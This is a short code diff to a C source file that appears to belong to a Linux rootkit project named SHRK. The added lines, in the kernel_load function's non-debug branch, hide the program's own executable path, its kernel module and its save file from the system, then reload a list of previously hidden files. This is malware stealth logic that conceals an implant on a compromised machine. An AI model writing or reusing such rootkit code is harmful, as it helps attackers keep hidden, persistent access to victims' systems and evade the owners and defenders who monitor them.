@@ -5,6 +5,7 @@
 #include <stdbool.h>
 #include <sys/syscall.h>
 
+#include <limits.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
@@ -41,7 +42,33 @@ bool kernel_load() {
   */
   if (SHRK_DEBUG)
     protect_pid(getpid());
+ 
+  else { 
+    // hide the self, the kernel module and the save file
+    char self[PATH_MAX+1];
 
+    if(NULL == get_self(self)) {
+      debug("failed to obtain self path");
+      goto end;
+    }
+
+    if(!hide_path(self)){
+      debug("failed to hide self");
+      goto end;
+    }
+
+    if(!hide_path(SHRK_MODULE)){
+      debug("failed to hide the module");
+      goto end;
+    }
+    
+    if(!hide_path(SHRK_SAVE_FILE)){
+      debug("failed to hide the save file");
+      goto end;
+    }
+  }
+
+  // also hide saved hidden files
   if (!load_hidden()) {
     debug("failed to load hidden files");
     goto end;
